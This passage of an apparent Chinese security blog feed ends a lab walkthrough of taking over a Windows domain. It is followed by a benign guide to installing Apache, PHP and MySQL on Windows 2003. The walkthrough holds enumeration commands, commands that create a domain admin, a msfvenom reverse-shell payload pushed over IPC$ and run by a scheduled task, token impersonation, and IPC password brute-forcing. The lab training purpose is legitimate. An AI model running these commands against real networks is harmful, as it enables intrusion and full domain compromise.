<h4 id="拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！"><a href="#拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！" class="headerlink" title="拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！"></a>拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line"># 收集域名信息</div><div class="line">net view  						//获取当前组的计算机名字</div><div class="line">net view /domain   			//查看所有域</div><div class="line">ping -n 1 [组计算机明] -4  	//从计算机名获取IP 地址</div><div class="line">net user /domain				//查看域中的用户名</div><div class="line">net group /domain				//查看域组名称</div><div class="line">net group &quot;Domain Admins&quot; /domain     				//查询管理员</div><div class="line">net group &quot;Domain controllers&quot;  /domain           //查询域控</div><div class="line">net group &quot;Domain Computers&quot; /domain				//查询所有计算机名字</div><div class="line">net config Workstation								//查看当前计算机名、全名、用户名、系统版本、工作站域、登录域</div><div class="line">net group &quot;Domain controllers&quot; 						//查看域控制器</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">net user admin Ad123test /add /domain	  			//添加普通域用户</div><div class="line">net group &quot;Domain Admins&quot; admin /add /domain 		//提升到域管理员</div><div class="line">###################################</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519141307_QYTX7T_Screenshot.jpeg" alt=""></p>
<h4 id="上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER-，下面我们尝试使用IPC-入侵DMEMBER1这台级别和我们相当的域主机。"><a href="#上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER-，下面我们尝试使用IPC-入侵DMEMBER1这台级别和我们相当的域主机。" class="headerlink" title="上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER ，下面我们尝试使用IPC$入侵DMEMBER1这台级别和我们相当的域主机。"></a>上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER ，下面我们尝试使用IPC$入侵DMEMBER1这台级别和我们相当的域主机。</h4><h2 id="0x06-IPC-入侵"><a href="#0x06-IPC-入侵" class="headerlink" title="0x06. IPC$ 入侵"></a>0x06. IPC$ 入侵</h2><h4 id="这里其实我们可以直接使用ms08-067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC-入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1-建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at-任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1-的反弹shell"><a href="#这里其实我们可以直接使用ms08-067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC-入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1-建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at-任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1-的反弹shell" class="headerlink" title="这里其实我们可以直接使用ms08_067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC$入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1 建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at 任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1 的反弹shell."></a>这里其实我们可以直接使用ms08_067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC$入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1 建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at 任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1 的反弹shell.</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">###################################</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.111 lport=4444 -f exe -o msf.exe	\\利用msf生成木马</div><div class="line">net use \\dmember1\ipc$                 //建立ipc$空连接</div><div class="line">copy c:\msf.exe \\dmember1\c$\msf.exe		//拷贝木马到目标机器上面去</div><div class="line">net time \\dmember1						//查看目标的时间</div><div class="line">at \\dmember1 2:35 %path%\msf.exe		//利用at任务执行木马，记住删除任务</div><div class="line">###################################</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519143905_hSTWQg_Screenshot.jpeg" alt=""></p>
<h4 id="现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。"><a href="#现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。" class="headerlink" title="现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。"></a>现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.1.111</div><div class="line">run</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519144432_cknEUr_Screenshot.jpeg" alt=""></p>
<h2 id="0x07-获取域控"><a href="#0x07-获取域控" class="headerlink" title="0x07. 获取域控"></a>0x07. 获取域控</h2><h4 id="当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…"><a href="#当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…" class="headerlink" title="当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…"></a>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use incognito </div><div class="line">list_tokens –u #列出可用token，假如找到域控token </div><div class="line">impersonate_token lab\\administrator</div></pre></td></tr></table></figure>
<h4 id="下面我换一种方式得到域控的shell："><a href="#下面我换一种方式得到域控的shell：" class="headerlink" title="下面我换一种方式得到域控的shell："></a>下面我换一种方式得到域控的shell：</h4><h4 id="首先根据之前收集到的信息我们知道管理员账号是admin-、Administrator，域控在DCSERVER这台主机上"><a href="#首先根据之前收集到的信息我们知道管理员账号是admin-、Administrator，域控在DCSERVER这台主机上" class="headerlink" title="首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上"></a>首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519154516_dBVly7_Screenshot.jpeg" alt=""></p>
<h4 id="接着我们依旧用administrator账号登陆w2k3利用爆破脚本对-admin-进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！"><a href="#接着我们依旧用administrator账号登陆w2k3利用爆破脚本对-admin-进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！" class="headerlink" title="接着我们依旧用administrator账号登陆w2k3利用爆破脚本对 admin$进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！"></a>接着我们依旧用administrator账号登陆w2k3利用爆破脚本对 admin$进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！</h4><blockquote>
<p>ipccrack.bat dcserver admin$ password.txt</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519160306_EFdL1v_Screenshot.jpeg" alt=""></p>
<h4 id="账号密码已经获取到了，接下来就是利用和ipc-入侵相似的手法进行后续渗透"><a href="#账号密码已经获取到了，接下来就是利用和ipc-入侵相似的手法进行后续渗透" class="headerlink" title="账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透"></a>账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519161150_GlFrvt_Screenshot.jpeg" alt=""></p>
<h2 id="0x08-结语"><a href="#0x08-结语" class="headerlink" title="0x08. 结语"></a>0x08. 结语</h2><h4 id="此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载："><a href="#此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载：" class="headerlink" title="此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载："></a>此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载：</h4><h4 id="网盘链接-密码-fcxx"><a href="#网盘链接-密码-fcxx" class="headerlink" title="网盘链接:  密码:fcxx"></a><a href="https://pan.baidu.com/s/1rp9jP3SLycSgrhqs7AxyXQ" target="_blank" rel="external">网盘链接:</a>  密码:fcxx</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-引言&quot;&gt;&lt;a href=&quot;#0x00-引言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 引言&quot;&gt;&lt;/a&gt;0x00. 引言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！&quot;&gt;&lt;a href=&quot;#emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。&lt;a href=&quot;http://www.freebuf.com/articles/network/172578.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;本文已投freebuf，禁止转载！&lt;/a&gt;&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin</title>
    <link href="http://TimeS0ng.github.io/2018/05/15/win2003-%E4%B8%8B%E6%90%AD%E5%BB%BAApache2-PHP5-Mysql-phpMyAdmin/"/>
    <id>http://TimeS0ng.github.io/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/</id>
    <published>2018-05-15T10:26:18.000Z</published>
    <updated>2019-01-25T01:22:23.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！"><a href="#emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！" class="headerlink" title="&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！"></a>&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到<a href="https://pan.baidu.com/s/1BnB2zr5hxbLRY1yHzX18rA" target="_blank" rel="external">我的云盘</a>  密码:8r5k，节约大家搜集软件的时间！</h4><a id="more"></a>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515161655_XsJ6cp_Screenshot.jpeg" alt=""></p>
<h2 id="0x01-搭建Apache2-2"><a href="#0x01-搭建Apache2-2" class="headerlink" title="0x01. 搭建Apache2_2"></a>0x01. 搭建Apache2_2</h2><blockquote>
<ol>
<li>运行apache2.2.10-win32-x86-no_ssl.msi</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162134_VYC3ZY_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>一路下一步，到了域名那里随便填一个域名就可以了，接着下一步选择Custom 模式自定义安装</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162424_q4MzyV_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>然后选择Apache Http Server 2.2.10，再点击change改变安装目录为C:\apm\apache2</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163752_P2zqe4_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>再一路默认就安装好了，在右下角有apache的图标，到目前为止apache就安装好了</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515184948_S8kjnH_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-安装PHP5"><a href="#0x02-安装PHP5" class="headerlink" title="0x02. 安装PHP5"></a>0x02. 安装PHP5</h2><blockquote>
<ol>
<li>将PHP5 文件夹拖到C:\apm\ 文件夹下</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163959_KVEfGb_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>将php5 文件下面的php.ini-development 文件修改为php.ini</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164353_J0zlrX_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>（1）打开php.ini 将 ; extension_dir = “./“ 修改为extension_dir = “c:\apm\php5\ext”  ; </li>
</ol>
<p>（2）去掉 extension=php_gd2.dll，extension=php_mbstring.dll，extension=php_mysql.dll, extension=php_mysqli.dll 前面的 ; </p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164814_CEmJ79_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172545_QSyuFx_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>（1）打开c:\apm\apache2\conf\httpd.conf 配置文件，找到DirectoryIndex index.html，修改为DirectoryIndex index.html index.php login.php</li>
</ol>
<p>（2）找到 #LoadModule vhost_alias_module modules/mod_vhost_alias.so 在这行的后面添加以下内容：</p>
</blockquote>
<p>“””</p>
<p>LoadModule php5_module “c:/apm/php5/php5apache2_2.dll”</p>
<p>AddType application/x-httpd-php .php</p>
<p>PHPIniDir “c:/apm/php5/php.ini”</p>
<p>“””</p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170629_zXk59X_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>添加系统环境变量，将 ;c:\apm\php5;c:\apm\php5\ext 加到环境变量后面</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170927_ajfy4v_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>重启计算机就能看到已经将PHP整合到Apache中了，此时已经可以解析php文件</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515171051_ibNpr4_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-安装phpMyAdmin"><a href="#0x03-安装phpMyAdmin" class="headerlink" title="0x03. 安装phpMyAdmin"></a>0x03. 安装phpMyAdmin</h2><blockquote>
<p>将phpMyAdmin 文件夹放到c:\apm\apache2\htdocs 文件夹下面，在目录中找到一个名为config.sample.inc.php的文件，将此文件复制一份并命名为config.inc.php，这个文件就是phpMyAdmin的配置文件了，重启apache就可以了</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172728_TN0Ix7_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-安装Mysql"><a href="#0x04-安装Mysql" class="headerlink" title="0x04. 安装Mysql"></a>0x04. 安装Mysql</h2><blockquote>
<ol>
<li>打开mysql-5.5.60-win32.msi ，一路下一步，大致步骤和Apache相似，在“Developer Components（开发者部分）”上左键单击，选择“This feature, and all subfeatures, will be installed on local hard drive.”</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172205_F4qTTj_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"><a href="#其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。" class="headerlink" title="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"></a>其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 前言&quot;&gt;&lt;/a&gt;0x00. 前言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！&quot;&gt;&lt;a href=&quot;#emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到&lt;a href=&quot;https://pan.baidu.com/s/1BnB2zr5hxbLRY1yHzX18rA&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;我的云盘&lt;/a&gt;  密码:8r5k，节约大家搜集软件的时间！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
